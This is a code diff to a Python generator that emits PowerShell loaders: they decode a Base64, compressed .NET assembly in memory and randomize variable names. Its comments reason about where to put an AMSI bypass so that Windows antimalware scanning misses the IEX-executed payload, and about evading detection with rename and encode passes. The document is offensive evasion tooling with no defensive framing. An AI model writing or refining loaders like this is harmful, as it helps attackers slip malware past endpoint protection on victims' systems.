@@ -50,16 +50,11 @@ def _generate_loader(assembly: bytes, amsi_technique: str = "patch") -> str:
     v_orig = _rand_var()
     v_result = _rand_var()
 
-    # AMSI bypass block
-    gen = _AMSI_GENERATORS.get(amsi_technique, _gen_patch_bypass)
-    amsi_block = gen()
+    # AMSI bypass is NOT included here — it must run BEFORE the Base64+IEX
+    # decode, not inside it (AMSI scans IEX content before executing).
+    # The encode pass prepends the bypass outside the encoded block.
 
-    # Type names must NOT be fragmented — PS1 [type] casts and New-Object
-    # require literal type names, not string concatenation expressions.
-    # Evasion for these comes from the rename + encode passes instead.
     lines = [
-        amsi_block,
-        "",
         f"${v_b64} = '{encoded}'",
         f"${v_compressed} = [Convert]::FromBase64String(${v_b64})",
         f"${v_ms} = New-Object System.IO.MemoryStream(,${v_compressed})",
